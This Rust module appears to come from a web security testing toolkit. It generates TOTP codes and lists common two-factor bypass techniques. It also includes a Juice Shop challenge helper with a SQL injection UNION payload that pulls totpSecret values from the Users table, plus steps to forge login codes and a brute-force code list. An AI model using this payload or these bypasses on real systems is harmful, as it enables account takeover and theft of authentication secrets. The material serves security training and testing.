//! TOTP/2FA utilities for security testing
//!
//! Provides TOTP generation, analysis, and bypass techniques.

use hmac::{Hmac, Mac};
use sha1::Sha1;

/// Generate TOTP code from secret
///
/// # Example
///
/// ```rust
/// use web_security_toolkit::totp::generate_totp;
///
/// let code = generate_totp("JBSWY3DPEHPK3PXP", 0);
/// assert_eq!(code.len(), 6);
/// ```
pub fn generate_totp(secret: &str, time_offset: i64) -> String {
    let key = base32_decode(secret);
    let time = (std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64
        + time_offset) as u64
        / 30;

    generate_hotp(&key, time)
}

/// Generate TOTP code for specific timestamp
pub fn generate_totp_at(secret: &str, timestamp: u64) -> String {
    let key = base32_decode(secret);
    let time = timestamp / 30;
    generate_hotp(&key, time)
}

/// Generate HOTP code
fn generate_hotp(key: &[u8], counter: u64) -> String {
    let counter_bytes = counter.to_be_bytes();

    let mut mac = Hmac::<Sha1>::new_from_slice(key).expect("HMAC can take key of any size");
    mac.update(&counter_bytes);
    let result = mac.finalize().into_bytes();

    let offset = (result[19] & 0x0f) as usize;
    let code = ((result[offset] & 0x7f) as u32) << 24
        | (result[offset + 1] as u32) << 16
        | (result[offset + 2] as u32) << 8
        | (result[offset + 3] as u32);

    format!("{:06}", code % 1_000_000)
}

/// Decode base32 string (without padding)
fn base32_decode(input: &str) -> Vec<u8> {
    let alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let input = input.to_uppercase().replace('=', "");

    let mut result = Vec::new();
    let mut buffer: u64 = 0;
    let mut bits_in_buffer = 0;

    for c in input.chars() {
        if let Some(value) = alphabet.find(c) {
            buffer = (buffer << 5) | value as u64;
            bits_in_buffer += 5;

            while bits_in_buffer >= 8 {
                bits_in_buffer -= 8;
                result.push((buffer >> bits_in_buffer) as u8);
                buffer &= (1 << bits_in_buffer) - 1;
            }
        }
    }

    result
}

/// Generate multiple TOTP codes around current time (for timing attacks)
pub fn generate_totp_window(secret: &str, window_size: i64) -> Vec<(i64, String)> {
    let mut codes = Vec::new();

    for offset in -window_size..=window_size {
        let code = generate_totp(secret, offset * 30);
        codes.push((offset, code));
    }

    codes
}

/// Common 2FA bypass techniques
#[derive(Debug, Clone)]
pub struct TwoFactorBypass {
    pub name: String,
    pub description: String,
    pub technique: BypassTechnique,
}

#[derive(Debug, Clone, PartialEq)]
pub enum BypassTechnique {
    ResponseManipulation,
    BackupCodes,
    TokenReuse,
    BruteForce,
    RaceCondition,
    PasswordReset,
    SessionFixation,
    DirectAccess,
}

impl TwoFactorBypass {
    pub fn new(name: &str, description: &str, technique: BypassTechnique) -> Self {
        Self {
            name: name.to_string(),
            description: description.to_string(),
            technique,
        }
    }
}

/// Common 2FA bypass methods
pub fn two_factor_bypasses() -> Vec<TwoFactorBypass> {
    vec![
        TwoFactorBypass::new(
            "Response manipulation",
            "Change response from 'false' to 'true' or status code manipulation",
            BypassTechnique::ResponseManipulation,
        ),
        TwoFactorBypass::new(
            "Null/empty code",
            "Try null, empty string, or '000000' as TOTP code",
            BypassTechnique::BruteForce,
        ),
        TwoFactorBypass::new(
            "Token reuse",
            "Reuse a valid token multiple times within the time window",
            BypassTechnique::TokenReuse,
        ),
        TwoFactorBypass::new(
            "Direct endpoint access",
            "Access protected resources directly without 2FA verification",
            BypassTechnique::DirectAccess,
        ),
        TwoFactorBypass::new(
            "Backup codes",
            "Use backup codes or recovery codes instead of TOTP",
            BypassTechnique::BackupCodes,
        ),
        TwoFactorBypass::new(
            "Password reset",
            "Reset password to bypass 2FA setup",
            BypassTechnique::PasswordReset,
        ),
        TwoFactorBypass::new(
            "Race condition",
            "Send multiple requests simultaneously",
            BypassTechnique::RaceCondition,
        ),
        TwoFactorBypass::new(
            "Session fixation",
            "Use pre-authenticated session to skip 2FA",
            BypassTechnique::SessionFixation,
        ),
    ]
}

/// Juice Shop 2FA challenge helpers
pub fn juice_shop_2fa() -> JuiceShop2FA {
    JuiceShop2FA {
        sqli_payload: "')) UNION SELECT id,email,totpSecret,4,5,6,7,8,9 FROM Users--".to_string(),
        description: "Extract TOTP secrets via SQLi, then generate valid codes".to_string(),
        steps: vec![
            "1. Use SQLi to extract totpSecret from Users table".to_string(),
            "2. Decode the base32 secret".to_string(),
            "3. Generate TOTP code using the secret".to_string(),
            "4. Login with the generated code".to_string(),
        ],
    }
}

#[derive(Debug, Clone)]
pub struct JuiceShop2FA {
    pub sqli_payload: String,
    pub description: String,
    pub steps: Vec<String>,
}

/// TOTP brute force code generator
pub fn brute_force_codes() -> Vec<String> {
    // Common codes that might work
    let mut codes: Vec<String> = vec![
        "000000".to_string(),
        "111111".to_string(),
        "123456".to_string(),
        "654321".to_string(),
        "999999".to_string(),
    ];

    // Sequential codes (for timing-based attacks)
    for i in 0..100 {
        codes.push(format!("{:06}", i));
    }

    codes
}

/// Analyze TOTP secret format
pub fn analyze_secret(secret: &str) -> SecretAnalysis {
    let normalized = secret.to_uppercase().replace(" ", "").replace("-", "");

    SecretAnalysis {
        original: secret.to_string(),
        normalized: normalized.clone(),
        length: normalized.len(),
        is_valid_base32: normalized
            .chars()
            .all(|c| "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=".contains(c)),
        decoded_length: if normalized
            .chars()
            .all(|c| "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=".contains(c))
        {
            Some(base32_decode(&normalized).len())
        } else {
            None
        },
    }
}

#[derive(Debug, Clone)]
pub struct SecretAnalysis {
    pub original: String,
    pub normalized: String,
    pub length: usize,
    pub is_valid_base32: bool,
    pub decoded_length: Option<usize>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base32_decode() {
        let decoded = base32_decode("JBSWY3DPEHPK3PXP");
        assert!(!decoded.is_empty());
    }

    #[test]
    fn test_generate_totp() {
        let code = generate_totp("JBSWY3DPEHPK3PXP", 0);
        assert_eq!(code.len(), 6);
        assert!(code.chars().all(|c| c.is_ascii_digit()));
    }

    #[test]
    fn test_generate_totp_window() {
        let codes = generate_totp_window("JBSWY3DPEHPK3PXP", 2);
        assert_eq!(codes.len(), 5); // -2, -1, 0, 1, 2
    }

    #[test]
    fn test_two_factor_bypasses() {
        let bypasses = two_factor_bypasses();
        assert!(!bypasses.is_empty());
    }

    #[test]
    fn test_analyze_secret() {
        let analysis = analyze_secret("JBSWY3DPEHPK3PXP");
        assert!(analysis.is_valid_base32);
        assert!(analysis.decoded_length.is_some());
    }

    #[test]
    fn test_juice_shop_2fa() {
        let info = juice_shop_2fa();
        assert!(info.sqli_payload.contains("totpSecret"));
    }
}
